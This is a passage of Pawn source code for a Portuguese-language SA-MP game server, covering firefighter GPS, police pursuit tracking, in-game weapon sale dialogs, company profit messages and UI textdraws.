		FireCreated[ID] = 0;
		FirePos[ID][0] = 0, FirePos[ID][1] = 0, FirePos[ID][2] = 0;
		#if defined Labels
	    	Delete3DTextLabel(FireText[i]);
		#endif
	}
}

stock IsValidFire(ID)
{
	if((FirePos[ID][0] != 0) && (FirePos[ID][1] != 0) && (FirePos[ID][2] != 0)) return true;
	else return false;
}

stock GetClosestFire(playerid)
{
	for(new i = 0; i < MaxFire; ++i)
	{
	    if(IsValidFire(i) && IsPlayerInRangeOfPoint(playerid, 1, FirePos[i][0],  FirePos[i][1],  FirePos[i][2]))
	    {
	        return i;
		}
	}
	return 0;
}

Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ,   Float:ObjX, Float:ObjY, Float:ObjZ,   Float:FrX, Float:FrY, Float:FrZ) {

	new Float:TGTDistance;
	TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ));
	new Float:tmpX, Float:tmpY, Float:tmpZ;
	tmpX = FrX * TGTDistance + CamX;
	tmpY = FrY * TGTDistance + CamY;
	tmpZ = FrZ * TGTDistance + CamZ;
	return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}

stock PlayerFaces(playerid, Float:x, Float:y, Float:z, Float:radius)
{
	new Float:cx,Float:cy,Float:cz,Float:fx,Float:fy,Float:fz;
	GetPlayerCameraPos(playerid, cx, cy, cz);
	GetPlayerCameraFrontVector(playerid, fx, fy, fz);
	return (radius >= DistanceCameraTargetToLocation(cx, cy, cz, x, y, z, fx, fy, fz));
}

stock IsPlayerLookingAtFire(playerid, fireid)
{
    new
        Float:cX, Float:cY, Float:cZ,
        Float:cPosX, Float:cPosY, Float:cPosZ,
        Float:x1, Float:y1, Float:z1,
        Float:x2, Float:y2, Float:z2,
        Float:dX, Float:dY, Float:dZ;
    GetVehiclePos(GetPlayerVehicleID(playerid), x1, y1, z1);
    GetPlayerCameraPos(playerid, cPosX, cPosY, cPosZ);
    GetPlayerCameraFrontVector(playerid, cX, cY, cZ);
    x2 = FirePos[fireid][0];
    y2 = FirePos[fireid][1];
    z2 = FirePos[fireid][2];
    new Float:Dist = GetDistanceBetweenPoints(x1, y1, z1, x2, y2, z2);
    dX = cPosX + floatmul(cX, Dist);
    dY = cPosY + floatmul(cY, Dist);
    dZ = cPosZ + floatmul(cZ, Dist);
    if(GetDistanceBetweenPoints(x1, y1, z1, dX, dY, dZ) <= 50.0)
    {
        return true;
    }
    return false;
}

forward resetCaminhao(v);
public resetCaminhao(v)
{
    estCamB[v] = 0;
	return 1;
}

forward AtualizaGPSFire(playerid, fireID);
public AtualizaGPSFire(playerid, fireID)
{
	if(IsPlayerConnected(playerid))
	{
		new
			Float:X,
			Float:Y,
			Float:Z,
			Float:Distance
		;
		GetPlayerPos(playerid, X, Y, Z);
		Distance = GetDistanceBetweenPoints(X, Y, Z, CasaInfo[fireID][PickupX], CasaInfo[fireID][PickupY], CasaInfo[fireID][PickupZ]);
		new
			string[256],
			zone[MAX_ZONE_NAME],
			playerState = GetPlayerState(playerid)
		;
		GetCasa2DZone(fireID, zone, MAX_ZONE_NAME);

		format(string, sizeof(string), "~n~~n~~n~Incendio~n~Distancia ~y~%.1f~n~~r~~h~Local ~n~~w~%s~n~Casa ID ~y~%d", Distance, zone, fireID);
	 	GameTextForPlayer(playerid, string, 1000, 5);

		if(Distance <= 4.0 && playerState == 1 || Distance > 4.0 && Distance <= 10.0 && playerState == 2 && GetPlayerVehicleID(playerid) == 407 || FireAtual[playerid] == 0)
		{
      		KillTimer(FireTimerP[playerid]);
	    	GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~b~~h~INCENDIO LOCALIZADO~n~~w~GPS Desabilitado.", 3000, 5);
	    	GivePlayerWeapon(playerid, 42, 9999);
		}
		else if(Distance > 4.0 && FireAtual[playerid] != 0)
		{
		    FireTimerP[playerid] = SetTimerEx("AtualizaGPSFire", 1000, false, "dd", playerid, fireID);
		}
	}
	return 1;
}

forward AtualizaGPSDis(playerid, fireID);
public AtualizaGPSDis(playerid, fireID)
{
	new
		Float:X,
		Float:Y,
		Float:Z,
		Float:Distance
	;
	X = 2770.6172, Y = -1627.9358, Z = 12.177;

	Distance = GetDistanceBetweenPoints(X, Y, Z, CasaInfo[fireID][PickupX], CasaInfo[fireID][PickupY], CasaInfo[fireID][PickupZ]);
	new
		string[256],
		zone[MAX_ZONE_NAME]
	;
	GetCasa2DZone(fireID, zone, MAX_ZONE_NAME);

	format(string, sizeof(string), "Distância %.1f  Local %s  Casa ID %d", Distance, zone, fireID);
 	SendClientMessage(playerid, COR_BRANCO, string);

	//if(Distance <= 4.0)

	return 1;
}

stock GetEmpresa2DZone(m, zone[], len)
{
	new
		Float:x,
		Float:y
	;
	x = EmpresaInfo[m][PickupX];
	y = EmpresaInfo[m][PickupY];

 	for(new i = 0; i != sizeof(SanAndreasZones); i++)
	{
		if(x >= SanAndreasZones[i][Zone_Area][0] && x <= SanAndreasZones[i][Zone_Area][3] && y >= SanAndreasZones[i][Zone_Area][1] && y <= SanAndreasZones[i][Zone_Area][4])
		{
			return format(zone, len, SanAndreasZones[i][Zone_Name], 0);
		}
	}
	return 0;
}

stock GetEmpresa2DCidade(m, zone[], len)
{
	new
		Float:x,
		Float:y
	;
	x = EmpresaInfo[m][PickupX];
	y = EmpresaInfo[m][PickupY];

 	for(new i = 0; i != sizeof(SanAndreasCidades); i++)
	{
		if(x >= SanAndreasCidades[i][cidadeArea][0] && x <= SanAndreasCidades[i][cidadeArea][3] && y >= SanAndreasCidades[i][cidadeArea][1] && y <= SanAndreasCidades[i][cidadeArea][4])
		{
			return format(zone, len, SanAndreasCidades[i][cidadeNome], 0);
		}
	}
	return 0;
}

stock GetCasa2DZone(CasaID, zone[], len)
{
	new
		Float:x,
		Float:y
	;
	x = CasaInfo[CasaID][PickupX];
	y = CasaInfo[CasaID][PickupY];

 	for(new i = 0; i != sizeof(SanAndreasZones); i++)
	{
		if(x >= SanAndreasZones[i][Zone_Area][0] && x <= SanAndreasZones[i][Zone_Area][3] && y >= SanAndreasZones[i][Zone_Area][1] && y <= SanAndreasZones[i][Zone_Area][4])
		{
			return format(zone, len, SanAndreasZones[i][Zone_Name], 0);
		}
	}
	return 0;
}

stock TextCreatePlayer(playerid)
{
	_INFO[playerid] = CreatePlayerTextDraw(playerid, 321.000000, 124.000000, "~r~~h~~h~Oferta de Arma");
	PlayerTextDrawAlignment(playerid, _INFO[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid, _INFO[playerid], 255);
	PlayerTextDrawFont(playerid, _INFO[playerid], 1);
	PlayerTextDrawLetterSize(playerid, _INFO[playerid], 0.569999, 2.099998);
	PlayerTextDrawColor(playerid, _INFO[playerid], -1);
	PlayerTextDrawSetOutline(playerid, _INFO[playerid], 1);
	PlayerTextDrawSetProportional(playerid, _INFO[playerid], 1);

	_ICONE[playerid] = CreatePlayerTextDraw(playerid, 299.000000, 151.000000, "ld_tatt:8gun");
	PlayerTextDrawAlignment(playerid, _ICONE[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid, _ICONE[playerid], 255);
	PlayerTextDrawFont(playerid, _ICONE[playerid], 4);
	PlayerTextDrawLetterSize(playerid, _ICONE[playerid], 1.200000, 9.000000);
	PlayerTextDrawColor(playerid, _ICONE[playerid], -1);
	PlayerTextDrawSetOutline(playerid, _ICONE[playerid], 0);
	PlayerTextDrawSetProportional(playerid, _ICONE[playerid], 1);
	PlayerTextDrawSetShadow(playerid, _ICONE[playerid], 1);
	PlayerTextDrawUseBox(playerid, _ICONE[playerid], 1);
	PlayerTextDrawBoxColor(playerid, _ICONE[playerid], 255);
	PlayerTextDrawTextSize(playerid, _ICONE[playerid], 44.000000, 40.000000);

	_MSGFORM[playerid] = CreatePlayerTextDraw(playerid, 319.000000, 199.000000, "_");
	PlayerTextDrawAlignment(playerid, _MSGFORM[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid, _MSGFORM[playerid], 255);
	PlayerTextDrawFont(playerid, _MSGFORM[playerid], 1);
	PlayerTextDrawLetterSize(playerid, _MSGFORM[playerid], 0.329999, 1.200000);
	PlayerTextDrawColor(playerid, _MSGFORM[playerid], -1);
	PlayerTextDrawSetOutline(playerid, _MSGFORM[playerid], 1);
	PlayerTextDrawSetProportional(playerid, _MSGFORM[playerid], 1);

	_ACEITAR[playerid] = CreatePlayerTextDraw(playerid,206.000000, 256.000000, "ACEITAR");
	PlayerTextDrawBackgroundColor(playerid,_ACEITAR[playerid], 255);
	PlayerTextDrawFont(playerid,_ACEITAR[playerid], 3);
	PlayerTextDrawLetterSize(playerid,_ACEITAR[playerid], 0.619998, 1.700000);
	PlayerTextDrawColor(playerid,_ACEITAR[playerid], -1);
	PlayerTextDrawSetOutline(playerid,_ACEITAR[playerid], 1);
	PlayerTextDrawSetProportional(playerid,_ACEITAR[playerid], 1);
	PlayerTextDrawUseBox(playerid,_ACEITAR[playerid], 1);
	PlayerTextDrawBoxColor(playerid,_ACEITAR[playerid], 0xFFFFFF00);
	PlayerTextDrawTextSize(playerid,_ACEITAR[playerid], 287.000000, 16.000000);
	PlayerTextDrawSetSelectable(playerid,_ACEITAR[playerid], 1);

	_RECUSAR[playerid] = CreatePlayerTextDraw(playerid,352.000000, 256.000000, "RECUSAR");
	PlayerTextDrawBackgroundColor(playerid,_RECUSAR[playerid], 255);
	PlayerTextDrawFont(playerid,_RECUSAR[playerid], 3);
	PlayerTextDrawLetterSize(playerid,_RECUSAR[playerid], 0.619998, 1.700000);
	PlayerTextDrawColor(playerid,_RECUSAR[playerid], -1);
	PlayerTextDrawSetOutline(playerid,_RECUSAR[playerid], 1);
	PlayerTextDrawSetProportional(playerid,_RECUSAR[playerid], 1);
	PlayerTextDrawUseBox(playerid,_RECUSAR[playerid], 1);
	PlayerTextDrawBoxColor(playerid,_RECUSAR[playerid], 0xFFFFFF00);
	PlayerTextDrawTextSize(playerid,_RECUSAR[playerid], 438.000000, 16.000000);
	PlayerTextDrawSetSelectable(playerid,_RECUSAR[playerid], 1);

	_MSGTEMPO[playerid] = CreatePlayerTextDraw(playerid, 319.000000, 252.000000, "_");
	PlayerTextDrawAlignment(playerid, _MSGTEMPO[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid, _MSGTEMPO[playerid], 255);
	PlayerTextDrawFont(playerid, _MSGTEMPO[playerid], 1);
	PlayerTextDrawLetterSize(playerid, _MSGTEMPO[playerid], 0.330000, 1.300000);
	PlayerTextDrawColor(playerid, _MSGTEMPO[playerid], -65281);
	PlayerTextDrawSetOutline(playerid, _MSGTEMPO[playerid], 1);
	PlayerTextDrawSetProportional(playerid, _MSGTEMPO[playerid], 1);

	TextLocal[playerid][0] = 0;
	TextLocal[playerid][1] = 0;
	TextLocal[playerid][2] = 0;
	TextLocal[playerid][3] = 0;

	if(WE_GetInt(f(playerid), "GPScidade") == 1)
	{
	    TextLocal[playerid][0] = 1;
        TextLocal[playerid][2] = WE_GetInt(f(playerid), "StatusGPSc");

		CityPlayer[playerid] = CreatePlayerTextDraw(playerid,189.000000, 376.000000, "_");
		PlayerTextDrawAlignment(playerid,CityPlayer[playerid], 2);
		PlayerTextDrawBackgroundColor(playerid,CityPlayer[playerid], 255);
		PlayerTextDrawFont(playerid,CityPlayer[playerid], 2);
		PlayerTextDrawLetterSize(playerid,CityPlayer[playerid], 0.270000, 1.000000);
		PlayerTextDrawColor(playerid,CityPlayer[playerid], -1);
		PlayerTextDrawSetOutline(playerid,CityPlayer[playerid], 0);
		PlayerTextDrawSetProportional(playerid,CityPlayer[playerid], 1);
		PlayerTextDrawSetShadow(playerid,CityPlayer[playerid], 1);
		PlayerTextDrawSetSelectable(playerid,CityPlayer[playerid], 0);

		if(TextLocal[playerid][2] == 1)
		{
			PlayerTextDrawShow(playerid, CityPlayer[playerid]);
		}
	}
	if(WE_GetInt(f(playerid), "GPSlocal") == 1)
	{
		TextLocal[playerid][1] = 1;
		TextLocal[playerid][3] = WE_GetInt(f(playerid), "StatusGPSl");

		LocalPlayer[playerid] = CreatePlayerTextDraw(playerid,189.000000, 396.000000, "_");
		PlayerTextDrawAlignment(playerid,LocalPlayer[playerid], 2);
		PlayerTextDrawBackgroundColor(playerid,LocalPlayer[playerid], 255);
		PlayerTextDrawFont(playerid,LocalPlayer[playerid], 2);
		PlayerTextDrawLetterSize(playerid,LocalPlayer[playerid], 0.200000, 0.899999);
		PlayerTextDrawColor(playerid,LocalPlayer[playerid], -1);
		PlayerTextDrawSetOutline(playerid,LocalPlayer[playerid], 0);
		PlayerTextDrawSetProportional(playerid,LocalPlayer[playerid], 1);
		PlayerTextDrawSetShadow(playerid,LocalPlayer[playerid], 1);
		PlayerTextDrawSetSelectable(playerid,LocalPlayer[playerid], 0);

		if(TextLocal[playerid][3] == 1)
		{
			PlayerTextDrawShow(playerid, LocalPlayer[playerid]);
		}
	}
	//playerGZtext(playerid);
}

forward citylocal_textplayer_update(playerid);
public citylocal_textplayer_update(playerid)
{
	if(TextLocal[playerid][0] == 1 && TextLocal[playerid][2] == 1 && pInfo[playerid][pLogin] == false || pInfo[playerid][Prof] == TAXISTA && pInfo[playerid][pLogin] == false && IsPlayerInAnyVehicle(playerid))
	{
		new
			Cidade[MAX_ZONE_NAME]
		;
		GetPlayerCidade(playerid, Cidade, MAX_ZONE_NAME);
		format(gStr, 128,  "~g~~h~~h~Cidade~n~~w~~h~%s", Cidade);
	    PlayerTextDrawSetString(playerid, CityPlayer[playerid], gStr);
	    PlayerTextDrawShow(playerid, CityPlayer[playerid]);
    }
    if(TextLocal[playerid][1] == 1 && TextLocal[playerid][3] == 1 && pInfo[playerid][pLogin] == false || pInfo[playerid][Prof] == TAXISTA && pInfo[playerid][pLogin] == false && IsPlayerInAnyVehicle(playerid))
	{
		new
			zone[MAX_ZONE_NAME]
		;
		GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
		format(gStr, 128,  "~b~~h~Local~n~~r~~h~%s", zone);
	    PlayerTextDrawSetString(playerid, LocalPlayer[playerid], gStr);
	    PlayerTextDrawShow(playerid, LocalPlayer[playerid]);
    }
    return 1;
}

stock pConectadoa(PlayerN[])
{
	foreach(Player, i)
	{
	    if(!strcmp(PlayerName(i), PlayerN, false)) return true;
	}
	return false;
}

stock pConectadoID(PlayerN[])
{
	foreach(Player, i)
	{
	    if(!strcmp(PlayerName(i), PlayerN, false)) return i;
	}
	return false;
}

stock sGivePlayerCash(playerid, quantia)
{
    GivePlayerCash(playerid, quantia);
    WE_SetInt(f(playerid), "Dinheiro", GetPlayerCash(playerid));
}

stock sResetPlayerCash(playerid)
{
    ResetPlayerCash(playerid);
    WE_SetInt(f(playerid), "Dinheiro", 0);
}

stock ArmaNome(idarmaid)
{
	new
		ARN[24]
	;
	if(idarmaid == 1)	{ ARN = "Silenced 9mm";}
	if(idarmaid == 2)	{ ARN = "Shotgun";}
	if(idarmaid == 3)	{ ARN = "Tec9";}
	if(idarmaid == 4)	{ ARN = "AK-47";}
	if(idarmaid == 5)	{ ARN = "Sniper Rifle";}
	return ARN;
}

stock TraficArma(playerid)
{
    ResetPlayerWeapons(playerid);

	if(armaEscol[playerid] == 1)
	{
	    trafcArma[playerid] = 23;
	}
	if(armaEscol[playerid] == 2)
	{
	    trafcArma[playerid] = 25;
	}
	if(armaEscol[playerid] == 3)
	{
	    trafcArma[playerid] = 32;
	}
	if(armaEscol[playerid] == 4)
	{
	    trafcArma[playerid] = 30;
	}
	if(armaEscol[playerid] == 5)
	{
	    trafcArma[playerid] = 34;
	}
    GivePlayerWeapon(playerid, trafcArma[playerid], 250);
    give[playerid] = true;
}

stock getArmaTarfic(playerid, killerid)
{
	new
		wp = GetPlayerWeapon(killerid)
	;
	if(wp == 23 && trafcArma[killerid] == wp || wp == 25 && trafcArma[killerid] == wp || wp == 32 && trafcArma[killerid] == wp || wp == 30 && trafcArma[killerid] == wp || wp == 34 && trafcArma[killerid] == wp)
	{
	    if(validArmas[killerid] == false && ArenaDuelo[killerid] == false)
	    {
		    SetPlayerWantedLevel(killerid, GetPlayerWantedLevel(killerid) + 1);
			format(gstring, sizeof(gstring), "(DM) %s [%d] com uma {DA1523}%s ilegal {FFFFFF}acaba de matar %s [%d].",  PlayerName(killerid), killerid, GetWeaponNameByID(wp), PlayerName(playerid), playerid);
		    return SendClientMessageToAll(COR_BRANCO, gstring), true;
	    }
	}
	return false;
}

forward showTextA@R(playerid);
public showTextA@R(playerid)
{
	PlayerTextDrawSetSelectable(playerid, _ACEITAR[playerid], true);
    PlayerTextDrawSetSelectable(playerid, _RECUSAR[playerid], true);

    PlayerTextDrawShow(playerid, _INFO[playerid]);
    PlayerTextDrawShow(playerid, _ICONE[playerid]);
    format(gstring, sizeof(gstring), "Traficante ~r~~h~%s~n~~n~~w~Oferece: ~h~%s~n~~w~Por: ~g~~h~R$%d", PlayerName(compraArm[playerid]), ArmaNome(armaEscol[playerid]), preccArma[playerid]);
	PlayerTextDrawSetString(playerid, _MSGFORM[playerid], gstring);
    PlayerTextDrawShow(playerid, _MSGFORM[playerid]);
    PlayerTextDrawShow(playerid, _ACEITAR[playerid]);
    PlayerTextDrawShow(playerid, _RECUSAR[playerid]);
    PlayerTextDrawShow(playerid, _MSGTEMPO[playerid]);

    SelectTextDraw(playerid, COR_ERRO);

	return 1;
}

forward tempomsgt(playerid);
public tempomsgt(playerid)
{
	if(temptemp_[playerid] <= 0)
	{
	    KillTimer(timerarms[playerid]);
    	PlayerTextDrawHide(playerid, _INFO[playerid]);
	    PlayerTextDrawHide(playerid, _ICONE[playerid]);
    	PlayerTextDrawHide(playerid, _MSGFORM[playerid]);
	    PlayerTextDrawHide(playerid, _ACEITAR[playerid]);
	    PlayerTextDrawHide(playerid, _RECUSAR[playerid]);
	    PlayerTextDrawHide(playerid, _MSGTEMPO[playerid]);
		CancelSelectTextDraw(playerid);
		SendClientMessage(playerid, COR_ERRO, "Você demorou para responder a oferta de armas!");
		format(gStr, 128, "%s demorou para responder a oferta de armas!", PlayerName(playerid));
		SendClientMessage(compraArm[playerid], COR_ERRO, gStr);
		compraArm[playerid] = -1;
		compraArm[compraArm[playerid]] = -1;
		preccArma[playerid] = -1;
		preccArma[preccArma[playerid]] = -1;
		armaEscol[playerid] = -1;
		armaEscol[armaEscol[playerid]] = -1;
        temptemp_[playerid] = -1;
	    return 1;
	}
    else if(temptemp_[playerid] > 0)
    {
        temptemp_[playerid] --;
		new
		    strTem[12]
		;
		format(strTem, sizeof(strTem), "Tempo~n~%d", temptemp_[playerid]);
		PlayerTextDrawSetString(playerid, _MSGTEMPO[playerid], strTem);
        timerarms[playerid] = SetTimerEx("tempomsgt", 1000, false, "d", playerid);
    }
	return 1;
}

stock spawnPolicia(playerid)
{
    if(pInfo[playerid][Prof] == POL_CIVIL)
    {
        format(gstring, 256, "{1E90FF}Você é um(a) oficial da lei\n\n{FFFFFF}Deseja ser levado ao departamento de polícia para equipar-se?");
		ShowPlayerDialog(playerid, 6540, DIALOG_STYLE_MSGBOX, "Spawn para oficiais", gstring, "Sim", "Não");
    }
	else if(pInfo[playerid][Prof] == POL_MILITAR)
    {
        format(gstring, 256, "{1E90FF}Você é um(a) oficial da lei\n\n{FFFFFF}Deseja ser levado ao departamento de polícia para equipar-se?");
		ShowPlayerDialog(playerid, 6541, DIALOG_STYLE_MSGBOX, "Spawn para oficiais", gstring, "Sim", "Não");
    }
	else if(pInfo[playerid][Prof] == POL_FEDERAL)
    {
        format(gstring, 256, "{1E90FF}Você é um(a) oficial da lei\n\n{FFFFFF}Deseja ser levado ao departamento de polícia para equipar-se?");
		ShowPlayerDialog(playerid, 6542, DIALOG_STYLE_MSGBOX, "Spawn para oficiais", gstring, "Sim", "Não");
    }
	else if(pInfo[playerid][Prof] == GUARDA_TRANSITO)
    {
        format(gstring, 256, "{1E90FF}Você é um(a) oficial da lei\n\n{FFFFFF}Deseja ser levado ao departamento de polícia para equipar-se?");
		ShowPlayerDialog(playerid, 6543, DIALOG_STYLE_MSGBOX, "Spawn para oficiais", gstring, "Sim", "Não");
    }
	else if(pInfo[playerid][Prof] == POL_RODOVIARIO)
    {
        format(gstring, 256, "{1E90FF}Você é um(a) oficial da lei\n\n{FFFFFF}Deseja ser levado ao departamento de polícia para equipar-se?");
		ShowPlayerDialog(playerid, 6544, DIALOG_STYLE_MSGBOX, "Spawn para oficiais", gstring, "Sim", "Não");
    }
}

forward AttProcura(playerid);
public AttProcura(playerid)
{
	if(pInfo[playerid][plocalizando] < 0)
	{
	    format(gStr, 128, "A procura com GPS à %s foi desligada.", pInfo[playerid][plocalizname]);
		SendClientMessage(playerid, COR_AMARELO, gStr);
		pInfo[playerid][plocalizando] = -1;
		pInfo[playerid][pproc] = false;
		format(pInfo[playerid][plocalizname], 24, "Ninguem");
		DisablePlayerCheckpoint(playerid);
	    return 1;
	}
    if(pInfo[playerid][plocalizando] >= 0)
    {
        new
			id = pInfo[playerid][plocalizando]
		;
		if(!IsPlayerConnected(id))
		{
			format(gStr, 128, "O(A) jogador(a) %s desconectou-se em perseguição.", pInfo[playerid][plocalizname]);
			SendClientMessage(playerid, COR_ERRO, gStr);
			pInfo[playerid][plocalizando] = -1;
			pInfo[playerid][pproc] = false;
			format(pInfo[playerid][plocalizname], 24, "Ninguem");
			DisablePlayerCheckpoint(playerid);
			return 1;
		}
		new
			Float:Distance
		;
		Distance = GetDistanceBetweenPlayers(playerid, id);

		new
			Float:X,
			Float:Y,
			Float:Z
		;
		GetPlayerPos(id, X, Y, Z);
		DisablePlayerCheckpoint(playerid);
		SetPlayerCheckpoint(playerid, X, Y, Z, 0.1);

		new
			zone[MAX_ZONE_NAME]
		;
		GetPlayer2DZone(id, zone, MAX_ZONE_NAME);

		if(Distance < 80.0)
		{
		    if(pInfo[playerid][pproc] == false)
		    {
		        pInfo[playerid][pproc] = true;
		    }
			format(gstring, 256, "~n~~n~~n~procurando %s~n~distacia %.1f~n~Local: %s~n~proximo de voce~n~~b~~h~capture-o", PlayerName(id), Distance, zone);
			GameTextForPlayer(playerid, gstring, 1000, 5);

		    format(gstring, 256, "~n~~n~~n~Policia~n~%s~n~esta solicitando~n~que voce ~r~~h~pare!", PlayerName(playerid));
		    GameTextForPlayer(id, gstring, 2000, 5);
		}
		if(Distance > 100.0)
		{
			if(pInfo[playerid][pproc] == true)
		    {
				format(gstring, 256, "~n~~n~~n~Voce esta fugindo de %s~n~da policia~n~~r~~h~pare!", PlayerName(playerid));
		    	GameTextForPlayer(id, gstring, 2000, 5);

		    	format(gstring, 256, "~n~~n~~n~%s~n~esta ~r~~h~fugindo~n~~w~distacia %.1f~n~Local: %s", PlayerName(id), Distance, zone);
				GameTextForPlayer(playerid, gstring, 1000, 5);

				if(pInfo[id][pproc] == false)
				{
				    pInfo[id][pproc] = true;
				}
		    }
		    else
		    {
				format(gstring, 256, "~n~~n~~n~procurando ~y~~h~%s~n~~w~distacia %.1f~n~Local: %s", PlayerName(id), Distance, zone);
				GameTextForPlayer(playerid, gstring, 1000, 5);
			}
		}
		SetTimerEx("AttProcura", 1000, false, "d", playerid);
	}
	return 1;
}

stock getPolicial(playerid)
{
    if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_RODOVIARIO) return true;
    else return false;
}

/*stock apeIngz(playerid, gzid)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
	{
        if(ZonaAtacada[gzid] != -1)
        {
            if(!strcmp(playerClan[playerid], ZoneInfo[gzid][zClan], true))
            {
                return  ZonaAtacada[gzid] = -1, false;
            }
        }
	}
	return true;
}*/

/*stock playerGZtext(playerid)
{
	TGangueZone[playerid] = CreatePlayerTextDraw(playerid, 338.000000, 420.000000, "_");
	PlayerTextDrawAlignment(playerid, TGangueZone[playerid], 2);
	PlayerTextDrawBackgroundColor(playerid, TGangueZone[playerid], 255);
	PlayerTextDrawFont(playerid, TGangueZone[playerid], 3);
	PlayerTextDrawLetterSize(playerid, TGangueZone[playerid], 0.420000, 1.300000);
	PlayerTextDrawColor(playerid, TGangueZone[playerid], -1);
	PlayerTextDrawSetOutline(playerid, TGangueZone[playerid], 1);
	PlayerTextDrawSetProportional(playerid, TGangueZone[playerid], 1);
}*/

/*stock salvGZ(gzid)
{
    format(gzfo, sizeof(gzfo), "GangueZones/%d.ini", gzid);

    if(fexist(gzfo))
    {
		WE_SetString(gzfo, "Dono", ZoneInfo[gzid][aClan]);
		WE_SetInt(gzfo, "Cor", ZoneInfo[gzid][zCor][0]);
		WE_SaveFile();
	}
}

stock GetPlayersInZone(gzid, ncla[])
{
    new
		count_m
	;
    foreach(Player, i)
    {
        if(!strcmp(ncla, playerClan[i], true))
        {
            if(IsPlayerInZone(i, gzid))
            {
                count_m++;
            }
        }
    }
    return count_m;
}*/

/*stock GetPlayerZone(playerid)
{
    for(new i = 0; i < sizeof(ZoneInfo); i++)
    {
        if(IsPlayerInZone(playerid, i))
        {
            return i;
        }
    }
    return -1;
}

stock IsPlayerInZone(playerid, zoneid)
{
    new
		Float:x,
		Float:y,
		Float:z
	;
    GetPlayerPos(playerid, x, y, z);
    return (x > ZoneInfo[zoneid][zMinX] && x < ZoneInfo[zoneid][zMaxX] && y > ZoneInfo[zoneid][zMinY] && y < ZoneInfo[zoneid][zMaxY]);
}*/

stock SetVehCorName(corid)
{
    switch(corid)
    {
        case 0: return 0xFFFFFFAA;
		case 1: return 0xFF8080FF;
		case 2: return 0xFFFF80FF;
		case 3: return 0x00FF80FF;
		case 4: return 0x80FF80FF;
		case 5: return 0x80FFFFFF;
		case 6: return 0x0080FFFF;
		case 7: return 0xFF80C0FF;
		case 8: return 0xFF80FFFF;
		case 9: return 0xFF0000FF;
		case 10: return 0xFFFF00FF;
		case 11: return 0x80FF00FF;
		case 12: return 0x00FF40FF;
		case 13: return 0x00FFFFFF;
		case 14: return 0x0080C0FF;
		case 15: return 0x8080C0FF;
		case 16: return 0xFF00FFFF;
		case 17: return 0x804040FF;
		case 18: return 0xFF8040FF;
		case 19: return 0x00FF00FF;
		case 20: return 0x008080FF;
		case 21: return 0x004080FF;
		case 22: return 0x8080FFFF;
		case 23: return 0x800040FF;
		case 24: return 0xFF0080FF;
		case 25: return 0x800000FF;
		case 26: return 0xFF8000FF;
		case 27: return 0x008000FF;
		case 28: return 0x008040FF;
		case 29: return 0x0000FFFF;
		case 30: return 0x0000A0FF;
		case 31: return 0x800080FF;
		case 32: return 0x8000FFFF;
		case 33: return 0x400000FF;
		case 34: return 0x804000FF;
		case 35: return 0x004000FF;
		case 36: return 0x004040FF;
		case 37: return 0x000080FF;
		case 38: return 0x400040FF;
		case 39: return 0x400080FF;
		case 40: return 0x808000FF;
		case 41: return 0x808080FF;
		case 42: return 0x408080FF;
		case 43: return 0xC0C0C0FF;
    }
    return 0xFFFFFFAA;
}

stock Gdata()
{
	new
		ano, mes, dia, amd[12]
	;
	getdate(ano, mes, dia);
	format(amd, 12, "%02d/%02d/%d", dia, mes, ano);
	return amd;
}

stock Ghora()
{
	new
	    hora, minuto, segundo, hms[12]
	;
	gettime(hora, minuto, segundo);
	format(hms, 12, "%02d:%02d:%d", hora, minuto, segundo);
	return hms;
}

forward Kicka(p); public Kicka(p) {
    #undef Kick
    Kick(p);
    #define Kick(%0) SetTimerEx("Kicka", 100, false, "i", %0)
    return 1;
}

forward Bana(p); public Bana(p) {
    #undef Ban
    Ban(p);
    #define Ban(%0) SetTimerEx("Bana", 100, false, "i", %0)
    return 1;
}

stock msglucrooff(playerid, m)
{
    format(gStr, 128, "Empresas/Empresa%d.ini", m);
	if(!strcmp(EmpresaInfo[m][Funcionario1], PlayerName(playerid), true))
	{
		new
			give_lucro = WE_GetInt(f(playerid), "qtdlucro"),
			atual_produ = WE_GetInt(f(playerid), "atualprod"),
			total_produ = WE_GetInt(gStr, "Producao1")
		;

		GameTextForPlayer(playerid, "~w~+ ~g~lucro empresa!", 2000, 1);
		format(gstring, 128, " %s o(a) proprietário(a) %s retirou o lucro da empresa %s ID %d que você trabalha.", EmpresaInfo[m][Funcionario1], EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], m);
		SendClientMessage(playerid, COR_AMARELO, gstring);
		format(gstring, 128, " Sua produção atual é %d produções, e o total de entregas já feita pelas empresa é de %d.", atual_produ, total_produ);
		SendClientMessage(playerid, COR_BRANCO, gstring);
		format(gstring, 128, " Você recebe {00B900}R$%d {FFFFFF}pelas suas entregas atuais.", give_lucro);
		SendClientMessage(playerid, COR_BRANCO, gstring);
		SendClientMessage(playerid, COR_AMARELO, " Sua produção agora está em 0, para lucrar mais volte a trabalhar.");
		sGivePlayerCash(playerid, give_lucro);
	}
	else if(!strcmp(EmpresaInfo[m][Funcionario2], PlayerName(playerid), true))
	{
		new
			give_lucro = WE_GetInt(f(playerid), "qtdlucro"),
			atual_produ = WE_GetInt(f(playerid), "atualprod"),
			total_produ = WE_GetInt(gStr, "Producao2")
		;

		GameTextForPlayer(playerid, "~w~+ ~g~lucro empresa!", 2000, 1);
		format(gstring, 128, " %s o(a) proprietário(a) %s retirou o lucro da empresa %s ID %d que você trabalha.", EmpresaInfo[m][Funcionario2], EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], m);
		SendClientMessage(playerid, COR_AMARELO, gstring);
